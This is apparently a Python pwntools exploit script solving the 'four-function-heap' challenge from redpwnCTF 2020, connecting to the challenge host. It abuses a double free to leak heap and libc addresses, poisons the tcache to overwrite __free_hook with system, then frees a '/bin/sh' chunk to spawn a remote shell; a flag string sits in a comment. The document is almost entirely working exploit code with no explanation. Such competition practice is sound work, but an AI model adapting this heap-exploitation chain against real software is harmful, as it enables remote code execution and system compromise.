#!/usr/bin/env python3

#flag{g3n3ric_f1ag_1n_1e3t_sp3ak}


from pwn import *

exe = ELF("four-function-heap")
libc = ELF("libc.so.6")
#ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
	return process([exe.path])


#p = conn()

p = remote("2020.redpwnc.tf", 31774)

def alloc(size, data="MMMM"):
  p.sendline("1")
  p.sendlineafter(":", "0")
  p.sendlineafter(":", str(size))
  p.sendlineafter(":", data)

  p.recvuntil(":")

def free():
  p.sendline("2")
  p.sendlineafter(":", "0")

  p.recvuntil(":")

def show():
  p.sendline("3")
  p.sendlineafter(": ", "0")
  p.recvuntil(":")


alloc(0x70)
free()
free()


show()



heap_leak= p.recvline().strip().decode("ISO-8859-1")
heap_leak+= "\x00"*(8 - len(heap_leak))
heap_leak= u64(heap_leak)

heap_base = heap_leak & ~0xfff 

log.info("HEAP Base @ 0x%x", heap_base)

first_chunk = heap_base + 0x2e0

alloc(0x900, p64(heap_leak)) 
alloc(0x10)

alloc(0x70, p64(first_chunk)*2)
alloc(0x70, p64(heap_leak))

alloc(0x70)  #0x900 chunk
free()
show()

libc_leak= p.recvline().strip().decode("ISO-8859-1")
libc_leak+= "\x00"*(8 - len(libc_leak))
libc_leak= u64(libc_leak)

LIBC_BASE = libc_leak - 0x3ebca0

log.info("Libc Base @ 0x%x", LIBC_BASE)


one_gadget = LIBC_BASE + 0x4f322 # <- This one gadget will work remotly too but I'm gonna use system("/bin/sh")

system = LIBC_BASE + libc.sym["system"]

log.info("System @ 0x%x", system)

free_hook = LIBC_BASE + libc.sym["__free_hook"]
log.info("__free_hook @ 0x%x", free_hook)

alloc(0x70, p64(free_hook-0x8))
alloc(0x70)
alloc(0x70, b"/bin/sh\x00"+p64(system))

pause()

free()

p.interactive()

